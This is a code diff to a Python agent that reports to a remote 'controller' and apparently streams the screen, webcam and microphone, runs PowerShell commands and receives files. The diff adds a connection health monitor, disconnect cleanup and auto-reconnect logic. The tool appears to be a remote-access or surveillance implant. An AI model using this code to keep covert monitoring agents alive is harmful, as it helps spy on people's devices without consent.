@@ -776,6 +776,16 @@ CHUNK = 1024
 CHANNELS = 1
 RATE = 44100
 
+# Connection Health Monitor
+CONNECTION_STATE = {
+    'connected': False,
+    'last_successful_emit': 0,
+    'last_check': 0,
+    'reconnect_needed': False,
+    'consecutive_failures': 0,
+    'force_reconnect': False
+}
+
 # WebRTC streaming variables
 WEBRTC_ENABLED = False
 WEBRTC_PEER_CONNECTIONS = {}  # agent_id -> RTCPeerConnection
@@ -5921,6 +5931,113 @@ def execute_in_powershell(command, timeout=30):
 # End PowerShell Terminal Formatting
 # ============================================================================
 
+# ============================================================================
+# Connection Health Monitor & Auto-Reconnect
+# ============================================================================
+
+def stop_all_operations():
+    """Stop all active operations (streams, commands, etc.)"""
+    log_message("[CLEANUP] Stopping all active operations...")
+    
+    # Stop screen streaming
+    try:
+        global STREAMING_ENABLED
+        if STREAMING_ENABLED:
+            stop_streaming()
+            log_message("[CLEANUP] Screen streaming stopped")
+    except Exception as e:
+        log_message(f"[CLEANUP] Error stopping screen stream: {e}")
+    
+    # Stop camera streaming
+    try:
+        global CAMERA_STREAMING_ENABLED
+        if CAMERA_STREAMING_ENABLED:
+            stop_camera_streaming()
+            log_message("[CLEANUP] Camera streaming stopped")
+    except Exception as e:
+        log_message(f"[CLEANUP] Error stopping camera stream: {e}")
+    
+    # Stop audio streaming
+    try:
+        global AUDIO_STREAMING_ENABLED
+        if AUDIO_STREAMING_ENABLED:
+            stop_audio_streaming()
+            log_message("[CLEANUP] Audio streaming stopped")
+    except Exception as e:
+        log_message(f"[CLEANUP] Error stopping audio stream: {e}")
+    
+    log_message("[CLEANUP] All operations stopped")
+
+def connection_health_monitor():
+    """
+    Monitor connection health every second.
+    If connection is lost:
+    1. Stop all streaming
+    2. Force reconnect
+    3. Clear pending operations
+    """
+    global CONNECTION_STATE
+    
+    log_message("[HEALTH_MONITOR] Connection health monitor started")
+    
+    while True:
+        try:
+            time.sleep(1)  # Check every second
+            
+            current_time = time.time()
+            CONNECTION_STATE['last_check'] = current_time
+            
+            # Check if Socket.IO is connected
+            is_connected = sio is not None and hasattr(sio, 'connected') and sio.connected
+            
+            # Connection state changed
+            if is_connected != CONNECTION_STATE['connected']:
+                if is_connected:
+                    # Just connected/reconnected
+                    log_message("[HEALTH_MONITOR] ✅ Connection ACTIVE")
+                    CONNECTION_STATE['connected'] = True
+                    CONNECTION_STATE['consecutive_failures'] = 0
+                    CONNECTION_STATE['reconnect_needed'] = False
+                    CONNECTION_STATE['force_reconnect'] = False
+                else:
+                    # Just disconnected
+                    log_message("[HEALTH_MONITOR] ❌ Connection LOST - initiating cleanup...")
+                    CONNECTION_STATE['connected'] = False
+                    CONNECTION_STATE['consecutive_failures'] += 1
+                    
+                    # Stop all active streaming immediately
+                    try:
+                        stop_all_operations()
+                    except Exception as e:
+                        log_message(f"[HEALTH_MONITOR] Error during cleanup: {e}")
+                    
+                    # Flag for forced reconnection
+                    CONNECTION_STATE['reconnect_needed'] = True
+                    log_message("[HEALTH_MONITOR] Triggering forced reconnection...")
+            
+            # If not connected for more than 5 seconds, force disconnect and reconnect
+            if not is_connected and CONNECTION_STATE['consecutive_failures'] > 5:
+                log_message("[HEALTH_MONITOR] ⚠️ Connection dead for 5+ seconds - forcing reconnect")
+                CONNECTION_STATE['force_reconnect'] = True
+                try:
+                    if sio is not None and hasattr(sio, 'disconnect'):
+                        sio.disconnect()
+                        log_message("[HEALTH_MONITOR] Forced disconnect to trigger clean reconnect")
+                except Exception as e:
+                    log_message(f"[HEALTH_MONITOR] Error forcing disconnect: {e}")
+                CONNECTION_STATE['consecutive_failures'] = 0
+                
+        except KeyboardInterrupt:
+            log_message("[HEALTH_MONITOR] Health monitor stopped by interrupt")
+            break
+        except Exception as e:
+            log_message(f"[HEALTH_MONITOR] Monitor error: {e}")
+            time.sleep(1)
+
+# ============================================================================
+# End Connection Health Monitor
+# ============================================================================
+
 def get_local_ip():
     """Get local IP address."""
     try:
@@ -8588,8 +8705,15 @@ def register_socketio_handlers():
     # Register connection handler
     @sio.event
     def connect():
+        global CONNECTION_STATE
         agent_id = get_or_create_agent_id()
-        log_message(f"Connected to controller, registering agent {agent_id}")
+        log_message(f"[CONNECT] Connected to controller, registering agent {agent_id}")
+        
+        # Update connection state
+        CONNECTION_STATE['connected'] = True
+        CONNECTION_STATE['consecutive_failures'] = 0
+        CONNECTION_STATE['reconnect_needed'] = False
+        
         safe_emit('agent_connect', {
         'agent_id': agent_id,
         'hostname': socket.gethostname(),
@@ -8612,6 +8736,27 @@ def register_socketio_handlers():
         },
         'timestamp': int(time.time() * 1000)
     })  # ✅ SAFE
+    
+    # Register disconnect handler
+    @sio.event
+    def disconnect():
+        global CONNECTION_STATE
+        agent_id = get_or_create_agent_id()
+        log_message(f"[DISCONNECT] Agent {agent_id} lost connection to controller")
+        
+        # Update connection state immediately
+        CONNECTION_STATE['connected'] = False
+        CONNECTION_STATE['reconnect_needed'] = True
+        
+        log_message("[DISCONNECT] Stopping all active streams and commands...")
+        
+        # Stop all operations
+        try:
+            stop_all_operations()
+        except Exception as e:
+            log_message(f"[DISCONNECT] Error during cleanup: {e}")
+        
+        log_message("[DISCONNECT] Cleanup complete - will auto-reconnect")
     
     # Register file transfer handlers
     sio.on('file_chunk_from_operator')(on_file_chunk_from_operator)
@@ -13228,6 +13373,17 @@ def agent_main():
                 retry_delay = min(connection_attempts * 5, max_retry_delay)
                 log_message(f"[WARN] Connection failed (attempt {connection_attempts}): {conn_err}")
                 log_message(f"[INFO] Retrying in {retry_delay} seconds...")
+                
+                # Update connection state
+                CONNECTION_STATE['connected'] = False
+                CONNECTION_STATE['consecutive_failures'] += 1
+                
+                # Stop all operations before retrying
+                try:
+                    stop_all_operations()
+                except:
+                    pass
+                
                 time.sleep(retry_delay)
             except KeyboardInterrupt:
                 log_message("\n[INFO] Received interrupt signal. Shutting down gracefully...")
